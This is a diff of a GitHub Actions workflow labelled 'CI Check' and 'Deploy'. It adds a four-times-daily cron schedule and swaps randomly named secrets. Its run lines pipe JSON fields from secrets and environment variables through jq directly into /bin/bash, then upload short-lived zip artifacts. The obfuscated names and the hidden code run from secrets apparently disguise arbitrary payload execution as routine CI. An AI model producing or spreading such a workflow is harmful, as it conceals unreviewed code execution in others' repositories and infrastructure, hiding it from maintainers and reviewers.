@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '32 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -17,15 +19,14 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          h4646: ${{ secrets.h4646 }}
+          vu5469: ${{ secrets.vu5469 }}
         run: |
-          printf '%s' "$h4646" | jq -r .i157 | /bin/bash
-          echo $qkm21394 | jq -r .bqxoz58493 | /bin/bash
-          echo $m0706 | jq -r .ql57903 | /bin/bash
+          printf '%s' "$vu5469" | jq -r .llx34056 | /bin/bash
+          echo $sznh11420 | jq -r .f8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: 2z4Qbq23
+          name: AqcRsRAu
           path: "*.zip"
           retention-days: 1
